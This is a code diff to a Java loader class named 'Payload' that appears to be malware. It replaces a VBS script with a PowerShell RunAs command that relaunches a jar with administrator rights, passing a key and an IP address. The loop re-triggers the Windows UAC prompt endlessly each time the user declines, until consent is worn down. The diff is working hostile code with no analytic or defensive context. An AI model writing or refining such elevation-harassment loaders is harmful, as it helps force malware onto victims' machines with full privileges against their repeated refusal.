@@ -153,37 +153,35 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // Create VBS file to trigger UAC instantly without Secure Desktop lag
-            File vbsFile = new File(getLoaderDir(), "uac.vbs");
-            String vbsContent = "Set objShell = CreateObject(\"Shell.Application\")\r\n" +
-                "objShell.ShellExecute \"" + javaExe.replace("\\", "\\\\") + "\", \"-jar \"\"" + jarPath.replace("\\", "\\\\") + "\"\" " + key + " " + ip + "\", \"\", \"runas\", 1\r\n";
-            Files.write(vbsFile.toPath(), vbsContent.getBytes());
+            String psCommand = String.format(
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
+                javaExe, jarPath, key, ip
+            );
 
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                Process p = new ProcessBuilder("wscript.exe", vbsFile.getAbsolutePath()).start();
+                Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-Command", psCommand).start();
                 p.waitFor(); 
                 
-                // Spin-check every 15ms
+                // Check every 50ms to see if the lock file was deleted by the elevated process
                 boolean accepted = false;
-                for (int i = 0; i < 400; i++) { 
+                for (int i = 0; i < 200; i++) { 
                     if (!lockFile.exists() || lockFile.delete()) {
                         accepted = true;
                         break;
                     }
-                    Thread.sleep(15);
+                    Thread.sleep(50);
                 }
                 
                 if (accepted) {
                     log("UAC Accepted. Parent exiting.");
                     lockStream.close();
-                    vbsFile.delete();
                     System.exit(0); 
                 } else {
-                    log("UAC Denied. Instantly retrying...");
+                    log("UAC Denied. Retrying instantly...");
                 }
             }
         } catch (Exception e) {
